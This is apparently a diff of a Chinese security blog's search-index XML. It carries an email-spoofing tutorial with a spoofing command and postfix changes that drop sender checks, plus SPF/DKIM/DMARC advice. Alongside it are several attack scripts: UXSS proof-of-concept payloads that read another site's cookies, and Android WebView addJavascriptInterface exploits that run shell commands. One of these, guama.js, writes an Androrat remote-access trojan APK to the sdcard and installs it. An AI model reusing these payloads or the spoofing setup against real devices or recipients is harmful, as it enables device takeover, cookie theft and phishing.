@@ -59,7 +59,7 @@
   <entry>
     <title><![CDATA[Something about email spoofing]]></title>
     <url>%2Farchives%2FEmail_spoofing.html</url>
-    <content type="text"><![CDATA[0x00 这是个啥？一般来说，我们收到一封邮件之后，都会首先看发件人，如果是比较重要的邮件，我们可能会去看发件人地址，但是，如果发件人是伪造的，你还能知道是谁再给你发邮件么？当我们在谷歌搜索发件人伪造的时候，可以看到很多很多的网站提供了这样的功能： 这些网站没有测试，不知道能不能成功伪造。 那到底是什么导致的发件人伪造呢？下面我们来分析分析造成发件人伪造的成因。 0x01 SMTP是什么？要想了解成因，我们需要首先了解一下什么是SMTP，首先先了解一下几个概念：MUA:Mail User Agent。用户邮件代理,用户通过MUA接收发送邮件.例如Outlook, FoxMail等。MTA: Mail Transfer Protocol。邮件传输代理,是SMTP的一种实现，MTA仅仅负责邮件的传输。如果信件的目的地并不是本身的用户，且该封信的相关数据符合使用 MTA 的权力， 那么MTA 就会将该封信再传送到下一部主机上。这即是所谓的转递的功能。MDA: Mail Deliver Agent，邮件分发代理。负责将接收到的邮件保存在邮件服务器上，在这里可以设置对邮件进行过滤或自动回复。MRA: Mail Receive Agent，邮件接收代理,用来实现IMAP,POP3协议,负责与MUA交互,将服务器上的邮件通过IMAP以及POP3传输给客户端。 SMTP全称是Simple Mail Transfer Protocol,直译过来就是简单邮件传输协议，主要的工作就是把邮件信息从发件人的邮件服务器中传送到接收人的邮件服务器中，偶尔我们使用MUA来发送邮件的话,也承载传输用户邮件到发件服务器的功能，但是SMTP存在一个问题，就是没有对发送方进行一个身份验证。用下面的图来说明一下邮件的投递过程。 请输入链接描述 1、用户利用MUA寄信到MTA，这里面包含了几个项：发信人与发信网站：例如 admin@evi1cg.me，其中evi1cg.me就是发信网站，即收信件的MTA。收信人与收信网站：例如 admin@email.server，其中admin就是email.server里的一个账号。2、当MTA收到信件后，会通过DNS的MX记录进行查询，如果email.server是MTA自己，此时MTA就会把邮件交给MDA处理，放置到收信者的信箱中。3、如果email.server不是自己，那么这个信件就会被转送出去。4、当远程MTA收到本地MTA转发的邮件后，会将信件交给它的MDA处理，等待用户的读取或下载。 正是由于MTA之间转发邮件是不需要认证的，所以这就成了可以伪造发件人的原因。 0x02 怎么搭建SMTP Server？如何快速搭建自己的SMTP Server？这个网上有很多教程，这里为了快速搭建，可以选择使用ewomail，代码是开源的,搭建起来也比较方便，也有很好地说明文档，EwoMail是基于postfix和Dovecot，按照说明文档很快就可以部署完毕了，部署完毕以后需要添加用户账号：之后就可以通过添加的账号来发送邮件了。 0x03 如何伪造域名？关于伪造域名有一个很好用的工具SimpleEmailSpoofer，下面我们就使用这个工具来测试一下：1python SimpleEmailSpoofer.py -t 目标邮箱 -f 要伪造的发件人地址 -n From_name -e 邮件内容 -j 邮件主题 -s 你自己的smtp地址 -p 25 --user 你添加的用户 --pass 你添加用户的密码 在这里可以看到报错了，Sender address rejected: not owned by user xxx, 这里是postfix设置的问题。需要进行一下修改/etc/postfix/main.cf找到smtpd_sender_login_maps，修改为：1smtpd_sender_login_maps = mysql:/etc/postfix/mysql/mysql-sender-login-maps.cf,pcre:/etc/postfix/login_maps.pcre 新建/etc/postfix/login_maps.pcre1/^(.*)$/ test@yourdomain.com 意思是允许用户test@yourdomain.com的用户使用任意domain 找到smtpd_recipient_restrictions，删除reject_unknown_sender_domain，这样就不会对发送的域进行验证了。 修改完成以后，执行以下命令：12postmap /etc/postfix/login_maps.pcrepostfix reload 修改完成以后，再次发送： 查看gmail: 当然，在原始邮件里面，还是有自己的域名信息。如何尽量减少自己的信息，可以参考这篇文章。 经过测试，如果收信服务器对SPF校验不通过的邮件未作处理，仍然可以伪造添加过SPF记录的域。如QQ邮箱检查SPF失败就直接拒绝接收邮件，但是gmail仍然接收。这里要注意一点，SPF中如果配置为~all，则表示为接受来信，但是做标记，QQ邮箱里就会接收到此类伪造的邮件，但是回放置于垃圾邮件里。 0x04 如何检测？这里有一个工具可以用来检测域名是否可以被伪造:spoofcheck，使用很简单，比如baidu: 0x05 如何解决？为了使得域名不会被伪造，需要为域名正确配置SPF、DKIM、DMARC。只配置SPF是不行的，关于SPF的配置可以参考这里，关于DKIM的配置，可以看这里，关于DMARC的配置可以参考这里。 0x06 参考1、https://www.jianshu.com/p/610d9bf0ae8b2、http://lomu.me/post/SPF-DKIM-DMARC-PTR3、https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix4、https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/5、https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles]]></content>
+    <content type="text"><![CDATA[0x00 这是个啥？一般来说，我们收到一封邮件之后，都会首先看发件人，如果是比较重要的邮件，我们可能会去看发件人地址，但是，如果发件人是伪造的，你还能知道是谁再给你发邮件么？当我们在谷歌搜索发件人伪造的时候，可以看到很多很多的网站提供了这样的功能： 这些网站没有测试，不知道能不能成功伪造。 那到底是什么导致的发件人伪造呢？下面我们来分析分析造成发件人伪造的成因。 0x01 SMTP是什么？要想了解成因，我们需要首先了解一下什么是SMTP，首先先了解一下几个概念：MUA:Mail User Agent。用户邮件代理,用户通过MUA接收发送邮件.例如Outlook, FoxMail等。MTA: Mail Transfer Protocol。邮件传输代理,是SMTP的一种实现，MTA仅仅负责邮件的传输。如果信件的目的地并不是本身的用户，且该封信的相关数据符合使用 MTA 的权力， 那么MTA 就会将该封信再传送到下一部主机上。这即是所谓的转递的功能。MDA: Mail Deliver Agent，邮件分发代理。负责将接收到的邮件保存在邮件服务器上，在这里可以设置对邮件进行过滤或自动回复。MRA: Mail Receive Agent，邮件接收代理,用来实现IMAP,POP3协议,负责与MUA交互,将服务器上的邮件通过IMAP以及POP3传输给客户端。 SMTP全称是Simple Mail Transfer Protocol,直译过来就是简单邮件传输协议，主要的工作就是把邮件信息从发件人的邮件服务器中传送到接收人的邮件服务器中，偶尔我们使用MUA来发送邮件的话,也承载传输用户邮件到发件服务器的功能，但是SMTP存在一个问题，就是没有对发送方进行一个身份验证。用下面的图来说明一下邮件的投递过程。 1、用户利用MUA寄信到MTA，这里面包含了几个项：发信人与发信网站：例如 admin@evi1cg.me，其中evi1cg.me就是发信网站，即收信件的MTA。收信人与收信网站：例如 admin@email.server，其中admin就是email.server里的一个账号。2、当MTA收到信件后，会通过DNS的MX记录进行查询，如果email.server是MTA自己，此时MTA就会把邮件交给MDA处理，放置到收信者的信箱中。3、如果email.server不是自己，那么这个信件就会被转送出去。4、当远程MTA收到本地MTA转发的邮件后，会将信件交给它的MDA处理，等待用户的读取或下载。 正是由于MTA之间转发邮件是不需要认证的，所以这就成了可以伪造发件人的原因。 0x02 怎么搭建SMTP Server？如何快速搭建自己的SMTP Server？这个网上有很多教程，这里为了快速搭建，可以选择使用ewomail，代码是开源的,搭建起来也比较方便，也有很好地说明文档，EwoMail是基于postfix和Dovecot，按照说明文档很快就可以部署完毕了，部署完毕以后需要添加用户账号：之后就可以通过添加的账号来发送邮件了。 0x03 如何伪造域名？关于伪造域名有一个很好用的工具SimpleEmailSpoofer，下面我们就使用这个工具来测试一下：1python SimpleEmailSpoofer.py -t 目标邮箱 -f 要伪造的发件人地址 -n From_name -e 邮件内容 -j 邮件主题 -s 你自己的smtp地址 -p 25 --user 你添加的用户 --pass 你添加用户的密码 在这里可以看到报错了，Sender address rejected: not owned by user xxx, 这里是postfix设置的问题。需要进行一下修改/etc/postfix/main.cf找到smtpd_sender_login_maps，修改为：1smtpd_sender_login_maps = mysql:/etc/postfix/mysql/mysql-sender-login-maps.cf,pcre:/etc/postfix/login_maps.pcre 新建/etc/postfix/login_maps.pcre1/^(.*)$/ test@yourdomain.com 意思是允许用户test@yourdomain.com的用户使用任意domain 找到smtpd_recipient_restrictions，删除reject_unknown_sender_domain，这样就不会对发送的域进行验证了。 修改完成以后，执行以下命令：12postmap /etc/postfix/login_maps.pcrepostfix reload 修改完成以后，再次发送： 查看gmail: 当然，在原始邮件里面，还是有自己的域名信息。如何尽量减少自己的信息，可以参考这篇文章。 经过测试，如果收信服务器对SPF校验不通过的邮件未作处理，仍然可以伪造添加过SPF记录的域。如QQ邮箱检查SPF失败就直接拒绝接收邮件，但是gmail仍然接收。这里要注意一点，SPF中如果配置为~all，则表示为接受来信，但是做标记，QQ邮箱里就会接收到此类伪造的邮件，但是回放置于垃圾邮件里。 0x04 如何检测？这里有一个工具可以用来检测域名是否可以被伪造:spoofcheck，使用很简单，比如baidu: 0x05 如何解决？为了使得域名不会被伪造，需要为域名正确配置SPF、DKIM、DMARC。只配置SPF是不行的，关于SPF的配置可以参考这里，关于DKIM的配置，可以看这里，关于DMARC的配置可以参考这里。 0x06 参考1、https://www.jianshu.com/p/610d9bf0ae8b2、http://lomu.me/post/SPF-DKIM-DMARC-PTR3、https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix4、https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/5、https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles]]></content>
       <categories>
         <category>运维</category>
       </categories>
@@ -483,8 +483,8 @@
         <category>奇技淫巧</category>
       </categories>
       <tags>
-        <tag>applocker</tag>
         <tag>bypass</tag>
+        <tag>applocker</tag>
       </tags>
   </entry>
   <entry>
@@ -1035,11 +1035,6 @@
     <content type="text"></content>
   </entry>
   <entry>
-    <title><![CDATA[Tags]]></title>
-    <url>%2Ftags%2Findex.html</url>
-    <content type="text"></content>
-  </entry>
-  <entry>
     <title><![CDATA[友情链接]]></title>
     <url>%2Ffriends%2Findex.html</url>
     <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna]]></content>
@@ -1050,14 +1045,19 @@
     <content type="text"></content>
   </entry>
   <entry>
-    <title></title>
-    <url>%2Ftools%2Fwebview.html</url>
-    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+    <title><![CDATA[Tags]]></title>
+    <url>%2Ftags%2Findex.html</url>
+    <content type="text"></content>
   </entry>
   <entry>
     <title><![CDATA[Tools]]></title>
     <url>%2Ftools%2Findex.html</url>
     <content type="text"><![CDATA[1 .PHP序列化注入 Link 2 .Webshells Link 3 .Powershell取证工具 Link 4 .各种小工具 Link 5 .DLL_Hijacker Link 6 .WebView检测 Link 7 .Uxss检测 Link POC1 POC2 8.FlashCSRF Link 9.在线工具 Link 10.图形化PowerShell的在线编辑器 Link 11.Duck ToolKit Link 12.在线C段查询 Link 13.reg2powershell Link 14.XSSOR Link github 15.正则分析 Link 16.Powershell压缩文件 Link….]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fwebview.html</url>
+    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1071,13 +1071,18 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
-    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
+    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
-    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
+    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1088,11 +1093,6 @@
     <title></title>
     <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
     <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
   </entry>
   <entry>
     <title></title>
